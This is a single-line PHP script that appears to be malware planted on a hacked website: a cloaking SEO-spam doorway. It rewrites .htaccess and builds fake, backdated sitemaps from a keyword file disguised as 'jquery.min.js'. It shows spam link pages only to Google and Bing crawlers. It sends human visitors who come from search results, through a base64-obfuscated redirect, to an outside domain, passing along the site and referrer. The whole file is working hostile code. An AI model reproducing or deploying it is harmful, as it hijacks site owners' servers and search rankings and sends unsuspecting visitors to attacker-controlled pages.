<?php error_reporting(0);define('H_SID','2');define('H_FILE','jquery.min.js');define('H_DIR',rtrim(rtrim(dirname($_SERVER['SCRIPT_NAME']),'/'),'\\').'/');if(!isset($_SERVER['REQUEST_SCHEME'])) $_SERVER['REQUEST_SCHEME'] = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']=='on'?'https':'http');$HTTP = $_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['HTTP_HOST'];define('H_HTTP',$HTTP);$htaccess = 'RewriteEngine On'."\n".'RewriteCond %{REQUEST_FILENAME} !-f'."\n".'RewriteCond %{REQUEST_FILENAME} !-d'."\n".'RewriteRule .* index.php [L]';if(!file_exists('.htaccess')) @file_put_contents('.htaccess',$htaccess);function _HYT($id,$str){$str = html_entity_decode($str);$str = preg_replace('/[^[:alnum:]]+/', ' ', $str);$str = preg_replace('/[[:blank:][:space:][:punct:]]+/', ' ', $str);$str = trim(strtolower($str));$str = preg_replace('/\s+/', '-', $str);if(strlen($str)>70) $str = trim(substr($str,0,70),'-');return H_DIR.$id.'-'.urlencode($str).'.html';}function _HYM($s='map'){if(empty($s)) $s = 'map';$file = $s.'.xml';if(@$_GET['new']=='1') @unlink($file);if(!file_exists($file)) {$code = '<?xml version="1.0" encoding="UTF-8"?>'."\n";$code .= '<urlset xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd" xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'."\n";$code.='<url><loc>'.H_HTTP.H_DIR.'</loc><changefreq>daily</changefreq><priority>1</priority></url>'."\n";if(is_file(H_FILE)&&$data=json_decode(file_get_contents(H_FILE),1)) {	 $keys = $data['k'];foreach(array_rand($keys,rand(3000,4000)) as $id){$code .='<url><loc>'.H_HTTP._HYT($id,$keys[$id]).'</loc><changefreq>daily</changefreq><priority>0.8</priority></url>'."\n";}}$code .= '</urlset>'."\n";@file_put_contents($file,$code);@touch($file,mktime(rand(0,12),rand(0,59),rand(0,59),rand(0,12),rand(0,12),rand(2018,2020)));} else {$code = file_get_contents($file);}header("Content-type:text/xml");echo $code;exit;}function _HY(){$referer = (!empty($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '');$isSpider = (!empty($_SERVER["HTTP_USER_AGENT"])&&preg_match('/google|bingbot/i', $_SERVER["HTTP_USER_AGENT"]));$URI = preg_replace('/\?.*$/','',$_SERVER['REQUEST_URI']);$tagId = 0; 	$host = str_replace('.','_',$_SERVER['HTTP_HOST']);if(preg_match('/\/([0-9]+)-.+html/i',$URI,$arr)) {$tagId = (int)$arr[1];}ob_clean();if(!$isSpider && preg_match('/\.(google|bing)\./i',$referer)) {header(base64_decode('TG9jYXRpb246IGh0dHA6Ly94Lm1hcnlzdG9yaWVzLmNvbS94Yy5waHA/Yz0=').H_SID."&h=".$_SERVER['HTTP_HOST']."&s=".urlencode($URI)."&r=".urlencode($referer));exit; }if(preg_match('/\/(sitemap|map|site|2021|news|blog|tags).xml/',$URI,$brr)||!empty($_GET['map'])) _HYM(@$brr[1]);if($isSpider) {if(is_file(H_FILE) && $data=json_decode(file_get_contents(H_FILE),1)) {$keys = $data['k'];$title = ucwords(empty($keys[$tagId]) ? $keys[0] : $keys[$tagId]);$List = '<li><strong><a href="'.$URI.'">'.$title.'</a></strong></li>'."\n";foreach(array_rand($keys,110) as $I){if(!empty($keys[$I])) $List .= '<li><a href="'._HYT($I,$keys[$I]).'">'.$keys[$I].'</a></li>'."\n";}$List .= '<li><a href="'.H_DIR.'">'.$keys[0].'</a></li>'."\n";$List .= '<li><a href="'.H_DIR.'sitemap.xml">'.$_SERVER['HTTP_HOST'].' Sitemap</a></li>'."\n";$HTMLs = '<!DOCTYPE html>'."\n".'<html lang="en">'."\n".'<head>'."\n".'<meta charset="utf-8" />'."\n".'<title>'.$title.'</title>'."\n".'<meta name="viewport" content="width=device-width, initial-scale=1">'."\n".'<meta name="robots" content="index,follow,noarchive" />'."\n".'<meta http-equiv="X-UA-Compatible" content="IE=edge">'."\n".'<meta name="author" content="'.$_SERVER['HTTP_HOST'].'">'."\n".'<link rel="canonical" href="'.H_HTTP.$URI.'" />'."\n".'</head>'."\n".'<body id="'.$host.'">'."\n".'<h1 class="'.$host.'_title">'.$title.'</h1>'."\n".'<div>'."\n".'<h2 class="'.$host.'_name">'.$title.'</h2>'."\n".'<hr>'."\n".'<ul class="'.$host.'_list">'.$List.'</ul>'."\n".'</div>'."\n".'<div>&copy; '.rand(2016,2020).'-'.@date('Y').' '.$_SERVER['HTTP_HOST'].'. All Rights Reserved</div>'."\n".'</body>'."\n".'</html>';exit($HTMLs);}}header("Location: /");exit;}_HY();